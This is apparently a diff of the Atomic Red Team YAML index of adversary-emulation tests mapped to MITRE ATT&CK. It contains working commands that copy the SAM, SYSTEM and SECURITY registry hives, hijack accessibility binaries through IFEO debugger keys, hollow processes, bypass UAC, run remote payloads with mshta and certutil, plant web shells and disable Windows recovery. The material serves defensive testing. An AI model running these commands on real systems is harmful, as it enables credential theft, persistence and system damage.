+        url: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1
+      x_mitre_defense_bypassed:
+      - File monitoring
+      - File system access controls
+      identifier: T1006
+    atomic_tests:
+    - name: File System Logical Offsets using PowerShell
+      description: |
+        This test uses PowerShell to copy files from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.
+        Credit to Joe Bialek (https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)
+      supported_platforms:
+      - windows
+      input_arguments:
+        sam_binary_path:
+          description: Path of the SAM file
+          type: string
+          default: C:\Windows\System32\config\sam
+        system_binary_path:
+          description: Path of the SYSTEM file
+          type: string
+          default: C:\Windows\System32\config\system
+        security_binary_path:
+          description: Path of the SECURITY file
+          type: string
+          default: C:\Windows\System32\config\security
+        output_folder:
+          description: Output folder path
+          type: Path
+          default: C:\Windows\Temp
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          . $PathToAtomicsFolder\T1006\src\Invoke-NinjaCopy.ps1
+          Invoke-NinjaCopy -Path "#{sam_binary_path}" -LocalDestination "#{output_folder}\sam"
+          Invoke-NinjaCopy -Path "#{system_binary_path}" -LocalDestination "#{output_folder}\system"
+          Invoke-NinjaCopy -Path "#{security_binary_path}" -LocalDestination "#{output_folder}\security"
+        cleanup_command: |-
+          rm "#{output_folder}\sam"
+          rm "#{output_folder}\system"
+          rm "#{output_folder}\security"
   T1222:
     technique:
       x_mitre_data_sources:
@@ -8443,14 +8714,13 @@ defense-evasion:
         powershell_process_name:
           description: Name of the created process
           type: string
-          default: calculator
+          default: calc
       executor:
         name: powershell
         elevation_required: false
         command: 'Start-Process #{powershell_command}
 
 '
-        cleanup_command: Stop-Process -Name "#{powershell_process_name}"
   T1183:
     technique:
       x_mitre_data_sources:
@@ -8547,16 +8817,20 @@ defense-evasion:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: winword.exe
+          default: C:\Windows\System32\calc.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
         command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
+
+'
+        cleanup_command: 'reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
+          File Execution Options\#{target_binary}" /v Debugger /f
 
 '
     - name: IFEO Global Flags
@@ -8569,22 +8843,22 @@ defense-evasion:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: notepad.exe
+          default: C:\Windows\System32\notepad.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
-          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"
-          /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess
-          /d "#{payload_binary}"
-
-'
+        command: |
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /t REG_DWORD /d 1
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "#{payload_binary}"
+        cleanup_command: |
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /f
   T1070:
     technique:
       x_mitre_data_sources:
@@ -9638,6 +9912,24 @@ defense-evasion:
           -Name #{registry_entry_storage}
 
 '
+    - name: Add domain to Trusted sites Zone
+      description: "Attackers may add a domain to the trusted site zone to bypass
+        defenses. Doing this enables attacks such as c2 over office365 as described
+        here:\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf
+        \n"
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet
+          Settings\\ZoneMap\\Domains\\bad-domain.com\\\"\n$name =\"bad-subdomain\"\nnew-item
+          $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2
+          -Type DWORD; \nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;
+          \nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD; \n"
+        cleanup_command: |-
+          $key = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\bad-domain.com\"
+          Remove-item  $key -Recurse
   T1170:
     technique:
       x_mitre_data_sources:
@@ -9736,7 +10028,7 @@ defense-evasion:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/mshta.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -9764,15 +10056,10 @@ defense-evasion:
         This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
       supported_platforms:
       - windows
-      input_arguments:
-        atomics_path:
-          description: path to atomics folder
-          type: path
-          default: "..\\..\\atomics"
       executor:
         name: command_prompt
         command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
-          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")
+          -noexit -file $PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
 
 '
     - name: Mshta Executes Remote HTML Application (HTA)
@@ -9785,10 +10072,12 @@ defense-evasion:
         hta_url:
           description: URL to HTA file for execution
           type: string
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/T1170.hta
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta
       executor:
         name: command_prompt
-        command: 'mshta #{hta_url}'
+        command: 'mshta #{hta_url}
+
+'
   T1096:
     technique:
       x_mitre_data_sources:
@@ -9892,7 +10181,7 @@ defense-evasion:
           type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
           extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
           findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe
-          certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
+          certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1096/src/test.ps1 c:\temp:ttt
           makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab
           print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
           reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
@@ -10371,6 +10660,89 @@ defense-evasion:
               ~/Library/Preferences
 
           2. Subsequently, follow the steps for adding and running via [Launch Agent](Persistence/Launch_Agent.md)
+  T1093:
+    technique:
+      x_mitre_data_sources:
+      - Process monitoring
+      - API monitoring
+      x_mitre_permissions_required:
+      - User
+      name: Process Hollowing
+      description: 'Process hollowing occurs when a process is created in a suspended
+        state then its memory is unmapped and replaced with malicious code. Similar
+        to [Process Injection](https://attack.mitre.org/techniques/T1055), execution
+        of the malicious code is masked under a legitimate process and may evade defenses
+        and detection analysis. (Citation: Leitch Hollowing) (Citation: Endgame Process
+        Injection July 2017)'
+      id: attack-pattern--1c338d0f-a65e-4073-a5c1-c06878849f21
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: defense-evasion
+      x_mitre_detection: |-
+        Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls that unmap process memory, such as ZwUnmapViewOfSection or NtUnmapViewOfSection, and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique. (Citation: Endgame Process Injection July 2017)
+
+        Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      created: '2017-05-31T21:31:09.815Z'
+      modified: '2018-10-17T00:14:20.652Z'
+      external_references:
+      - external_id: T1093
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1093
+      - description: Leitch, J. (n.d.). Process Hollowing. Retrieved November 12,
+          2014.
+        source_name: Leitch Hollowing
+        url: http://www.autosectools.com/process-hollowing.pdf
+      - description: 'Hosseini, A. (2017, July 18). Ten Process Injection Techniques:
+          A Technical Survey Of Common And Trending Process Injection Techniques.
+          Retrieved December 7, 2017.'
+        source_name: Endgame Process Injection July 2017
+        url: https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
+      x_mitre_defense_bypassed:
+      - Process whitelisting
+      - Whitelisting by file name or path
+      - Signature-based detection
+      - Anti-virus
+      identifier: T1093
+    atomic_tests:
+    - name: Process Hollowing using PowerShell
+      description: |
+        This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.
+        Credit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)
+      supported_platforms:
+      - windows
+      input_arguments:
+        parent_process_name:
+          description: Name of the parent process
+          type: string
+          default: explorer
+        sponsor_binary_path:
+          description: Path of the sponsor binary (executable that will host the binary)
+          type: string
+          default: C:\Windows\System32\calc.exe
+        hollow_binary_path:
+          description: Path of the binary to hollow (executable that will run inside
+            the sponsor)
+          type: string
+          default: C:\Windows\System32\cmd.exe
+        spawnto_process_name:
+          description: Name of the process to spawn
+          type: string
+          default: calc
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          . $PathToAtomicsFolder\T1093\src\Start-Hollow.ps1
+          $ppid=Get-Process #{parent_process_name} | select -expand id
+          Start-Hollow -Sponsor "#{sponsor_binary_path}" -Hollow "#{hollow_binary_path}" -ParentPID $ppid -Verbose
+        cleanup_command: Stop-Process -Name "#{spawnto_process_name}"
   T1055:
     technique:
       x_mitre_permissions_required:
@@ -10719,7 +11091,9 @@ defense-evasion:
         command: |
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library #{source_file}
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{file_name}
-          del #{file_name}
+        cleanup_command: 'del #{file_name}
+
+'
     - name: Regsvs Uninstall Method Call Test
       description: 'Executes the Uninstall Method, No Admin Rights Required, Requires
         SNK
@@ -10745,6 +11119,7 @@ defense-evasion:
           Set-Content key.snk -Value $Content -Encoding Byte
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk #{source_file}
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{file_name}
+        cleanup_command: |
           del #{file_name}
           del key.snk
   T1117:
@@ -11577,7 +11952,7 @@ defense-evasion:
         remote_payload:
           description: A remote payload to execute using PubPrn.vbs.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/payloads/T1216.sct
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/src/T1216.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -11618,11 +11993,12 @@ defense-evasion:
       executor:
         name: command_prompt
         elevation_required: false
-        prereq_command: ''
         command: |
           set comspec=#{command_to_execute}
           cscript manage-bde.wsf
-        cleanup_command: set comspec=C:\Windows\System32\cmd.exe
+        cleanup_command: 'set comspec=C:\Windows\System32\cmd.exe
+
+'
   T1151:
     technique:
       x_mitre_data_sources:
@@ -12028,7 +12404,7 @@ defense-evasion:
         filename:
           description: Location of the project file
           type: Path
-          default: T1127.csproj
+          default: PathToAtomicsFolder\T1127\src\T1127.csproj
       executor:
         name: command_prompt
         elevation_required: false
@@ -12453,12 +12829,13 @@ privilege-escalation:
         elevation_required: true
         command: |
           #list processes by user,
-
           $owners = @{}
           gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
           get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
+
           #Steal Token
-          . .\src\T1134.ps1
+          Set-Location $PathToAtomicsFolder
+          .\T1134\src\T1134.ps1
   T1015:
     technique:
       x_mitre_permissions_required:
@@ -12544,11 +12921,23 @@ privilege-escalation:
           type: String
           default: osk.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - sethc
@@ -12563,11 +12952,23 @@ privilege-escalation:
           type: String
           default: sethc.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - utilman
@@ -12582,11 +12983,24 @@ privilege-escalation:
           type: String
           default: utilman.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger
+          /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - magnify
@@ -12601,11 +13015,24 @@ privilege-escalation:
           type: String
           default: magnify.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger
+          /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - narrator
@@ -12620,11 +13047,24 @@ privilege-escalation:
           type: String
           default: narrator.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\narrator.exe" /v Debugger
+          /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - DisplaySwitch
@@ -12639,11 +13079,24 @@ privilege-escalation:
           type: String
           default: DisplaySwitch.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v Debugger
+          /f
 
 '
     - name: Attaches Command Prompt As Debugger To Process - AtBroker
@@ -12658,11 +13111,24 @@ privilege-escalation:
           type: String
           default: atbroker.exe
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: true
-        command: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d
-          "C:\windows\system32\cmd.exe" /f
+        command: |
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe"
+          $Value = "C:\windows\system32\cmd.exe"
+          $Name = "Debugger"
+          IF(!(Test-Path $registryPath))
+           {
+            New-Item -Path $registryPath -Force | Out-Null
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
+           }
+          ELSE
+           {
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value
+           }
+        cleanup_command: 'reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+          NT\CurrentVersion\Image File Execution Options\atbroker.exe" /v Debugger
+          /f
 
 '
   '':
@@ -13182,7 +13648,7 @@ privilege-escalation:
           Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\fodhelper.exe"
         cleanup_command: 'Remove-Item "HKCU:\software\classes\ms-settings" -force
-          -Recurse
+          -Recurse -ErrorAction Ignore
 
 '
     - name: Bypass UAC using ComputerDefaults - PowerShell
@@ -13229,9 +13695,8 @@ privilege-escalation:
           mkdir "\\?\C:\Windows \System32\"
           copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
           mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
-        cleanup_command: |
-          rd "\\?\C:\Windows \" /S /Q
-          del "c:\testbypass.exe"
+        cleanup_command: "rd \"\\\\?\\C:\\Windows \\\" /S /Q\ndel \"c:\\testbypass.exe\"
+          >nul 2>nul \n"
   T1038:
     technique:
       x_mitre_permissions_required:
@@ -13573,7 +14038,7 @@ privilege-escalation:
         file_name:
           description: Dll To Inject
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1179\bin\T1179x64.dll
+          default: PathToAtomicsFolder\T1179\bin\T1179x64.dll
         server_name:
           description: TLS Server To Test Get Request
           type: Url
@@ -13680,16 +14145,20 @@ privilege-escalation:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: winword.exe
+          default: C:\Windows\System32\calc.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
         command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
+
+'
+        cleanup_command: 'reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
+          File Execution Options\#{target_binary}" /v Debugger /f
 
 '
     - name: IFEO Global Flags
@@ -13702,22 +14171,22 @@ privilege-escalation:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: notepad.exe
+          default: C:\Windows\System32\notepad.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
-          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"
-          /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess
-          /d "#{payload_binary}"
-
-'
+        command: |
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /t REG_DWORD /d 1
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "#{payload_binary}"
+        cleanup_command: |
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /f
   T1160:
     technique:
       x_mitre_permissions_required:
@@ -14810,8 +15279,6 @@ privilege-escalation:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         payload:
@@ -14834,8 +15301,6 @@ privilege-escalation:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         file_to_setuid:
@@ -14853,8 +15318,6 @@ privilege-escalation:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         file_to_setuid:
@@ -14925,32 +15388,37 @@ privilege-escalation:
       modified: '2019-07-18T17:58:17.016Z'
       identifier: T1165
     atomic_tests:
-    - name: Startup Items
+    - name: add file to Local Library StartupItems
       description: |
-        Modify or create an file in StartupItems
+        Modify or create an file in /Library/StartupItems
 
         [Reference](https://www.alienvault.com/blogs/labs-research/diversity-in-recent-mac-malware)
       supported_platforms:
       - macos
       executor:
-        name: manual
-        steps: '1. /Library/StartupItems/StartupParameters.plist
+        name: sh
+        elevation_required: true
+        command: 'sudo touch /Library/StartupItems/EvilStartup.plist
 
 '
-    - name: Startup Items (emond rule)
-      description: 'Establish persistence via a rule run by emond daemon at startup,
-        based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
+        cleanup_command: 'sudo rm /Library/StartupItems/EvilStartup.plist
+
+'
+    - name: Persistance with Event Monitor - emond
+      description: 'Establish persistence via a rule run by OSX''s emond (Event Monitor)
+        daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
 
 '
       supported_platforms:
       - macos
       input_arguments:
         plist:
-          description: Path to emond plist file
+          description: Path to attacker emond plist file
           type: path
-          default: "/path/to/T1165_emond.plist"
+          default: "$PathToAtomics/T1165/src/T1165_emond.plist"
       executor:
         name: sh
+        elevation_required: true
         command: |
           sudo cp "#{plist}" /etc/emond.d/rules/T1165_emond.plist
           sudo touch /private/var/db/emondClients/T1165
@@ -15183,7 +15651,7 @@ privilege-escalation:
         web_shells:
           description: Path of Web Shell
           type: path
-          default: PathToAtomicsFolder\T1100\shells\
+          default: PathToAtomicsFolder\T1100\src\
       executor:
         name: command_prompt
         command: 'xcopy #{web_shells} #{web_shell_path}
@@ -15260,18 +15728,26 @@ impact:
         user_account:
           description: User account whose password will be changed.
           type: string
-          default: Administrator
+          default: AtomicAdministrator
         new_password:
           description: New password for the specified account.
           type: string
           default: HuHuHUHoHo283283@dJD
+        new_user_password:
+          description: Password to use if user account must be created first
+          type: string
+          default: User2ChangePW!
+      dependencies:
+      - description: 'User account to change password of must exist (User: #{user_account})'
+        prereq_command: 'net user #{user_account}'
+        get_prereq_command: 'net user #{user_account} #{new_user_password} /add'
       executor:
         name: command_prompt
         elevation_required: true
-        prereq_command: 'net.exe user #{user_account}
+        command: 'net.exe user #{user_account} #{new_password}
 
 '
-        command: 'net.exe user #{user_account} #{new_password}
+        cleanup_command: 'net.exe user #{user_account} /delete
 
 '
     - name: Delete User - Windows
@@ -15285,12 +15761,17 @@ impact:
           description: User account to be deleted.
           type: string
           default: AtomicUser
+        new_user_password:
+          description: Password to use if user account must be created first
+          type: string
+          default: User2DeletePW!
+      dependencies:
+      - description: 'User account to delete must exist (User: #{user_account})'
+        prereq_command: 'net user #{user_account}'
+        get_prereq_command: 'net user #{user_account} #{new_user_password} /add'
       executor:
         name: command_prompt
         elevation_required: true
-        prereq_command: |
-          net.exe user #{user_account} /add
-          net.exe user #{user_account} P@$$w0rd
         command: 'net.exe user #{user_account} /delete'
   T1485:
     technique:
@@ -15390,9 +15871,9 @@ impact:
 
 '
     - name: Windows - Disable Windows Recovery Console Repair
-      description: "Disables repair by the Windows Recovery Console on boot. \nThis
-        technique is used by numerous ransomware families and APT malware such as
-        Olympic Destroyer.\n"
+      description: |
+        Disables repair by the Windows Recovery Console on boot.
+        This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
       supported_platforms:
       - windows
       executor:
@@ -15401,6 +15882,9 @@ impact:
         command: |
           bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
           bcdedit.exe /set {default} recoveryenabled no
+        cleanup_command: |
+          bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures
+          bcdedit.exe /set {default} recoveryenabled yes
     - name: Windows - Overwrite file with Sysinternals SDelete
       description: |
         Overwrites and deletes a file using Sysinternals SDelete.
@@ -15408,25 +15892,32 @@ impact:
       supported_platforms:
       - windows
       input_arguments:
-        file_to_overwrite:
-          description: Path of file to overwrite and remove
+        sdelete_exe:
+          description: Path of sdelete executable
           type: Path
-          default: C:\some\file.txt
+          default: PathToAtomicsFolder\T1485\bin\sdelete.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Secure delete tool from Sysinternals must exist on disk at specified
+          location (#{sdelete_exe})
+        prereq_command: 'if (Test-Path #{sdelete_exe}) {0} else {1}'
+        get_prereq_command: |-
+          Invoke-WebRequest "https://download.sysinternals.com/files/SDelete.zip" -OutFile "$env:TEMP\SDelete.zip"
+          Expand-Archive $env:TEMP\SDelete.zip $env:TEMP\Sdelete -Force
